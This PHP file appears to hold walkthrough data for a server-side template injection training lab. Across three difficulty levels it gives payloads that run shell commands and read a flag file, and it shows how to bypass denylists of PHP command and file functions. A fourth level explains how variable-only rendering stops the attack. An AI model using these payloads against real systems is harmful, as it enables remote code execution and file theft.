<?php
$p = '/labs/ssti-greeting/run?tpl=';
return [
  'low' => [
    'goal' => "Execute a command through the template.",
    'steps' => [
      "Confirm injection: {{7*7}} renders as 49, not the literal text.",
      "Call a function: {{system('cat /opt/forge/flag.txt')}}",
    ],
    'why' => "Your input is compiled as the template, so the engine evaluates your expression. 7*7 becoming 49 proves it; from there any expression, including a shell command, runs on the server.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("{{system('cat /opt/forge/flag.txt')}}")]],
  ],
  'medium' => [
    'goal' => "Read the file when command functions are blocked.",
    'steps' => [
      "system, exec, shell_exec, passthru and backticks are blocked.",
      "Read the file directly without a shell: {{file_get_contents('/opt/forge/flag.txt')}}",
    ],
    'why' => "Blocking command functions does not stop expression evaluation; a file-reading function reaches the data just as well and is not on the list.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("{{file_get_contents('/opt/forge/flag.txt')}}")]],
  ],
  'high' => [
    'goal' => "Read the file against a longer function blacklist.",
    'steps' => [
      "More functions are blocked, including file_get_contents and readfile.",
      "Use file(), which returns the lines: {{implode('',file('/opt/forge/flag.txt'))}}",
    ],
    'why' => "PHP has many ways to reach the same capability. The denylist misses file(), so joining its lines gives you the file contents.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("{{implode('',file('/opt/forge/flag.txt'))}}")]],
  ],
  'secure' => [
    'goal' => "Confirm variable-only rendering blocks evaluation.",
    'steps' => [
      "The secure renderer substitutes only known variable names and never evaluates expressions.",
      "Send {{system('cat /opt/forge/flag.txt')}} and watch it render as inert text.",
    ],
    'why' => "Treating user input as data for a fixed template, rather than as the template itself, removes the evaluation step entirely, so there is nothing to execute.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode("{{system('cat /opt/forge/flag.txt')}}")]],
  ],
];
